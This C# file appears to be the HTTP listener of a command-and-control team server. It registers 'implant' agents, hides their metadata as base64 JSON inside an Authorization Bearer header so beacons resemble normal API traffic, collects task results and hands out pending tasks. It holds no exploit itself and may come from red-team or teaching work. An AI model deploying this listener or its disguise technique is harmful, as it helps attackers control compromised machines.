using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;

        public HttpListenerController(IAgentService agentService)
        {
            this._agentService=agentService;
        }

        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return NotFound();

            var agent = this._agentService.GetAgent(metadata.Id);
            if(agent == null)
            {
                agent = new Agent(metadata);
                this._agentService.AddAgent(agent);
            }

            agent.CheckIn();

            if(HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);

                agent.AddTaskResults(results);

            }


            var tasks = agent.GetPendingTaks();

            return Ok(tasks);
        }

        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            //Auhorization: Bearer <base64>
            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
                return null;

            var encodedMetaData = encodedMetaDataHeader.ToString();

            if (!encodedMetaData.StartsWith("Bearer "))
                return null;

            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }

        public async Task<IActionResult> Download()
        {
            return Ok();
        }

        public async Task<IActionResult> DownloadChunk()
        {
            return Ok();
        }
    }
}
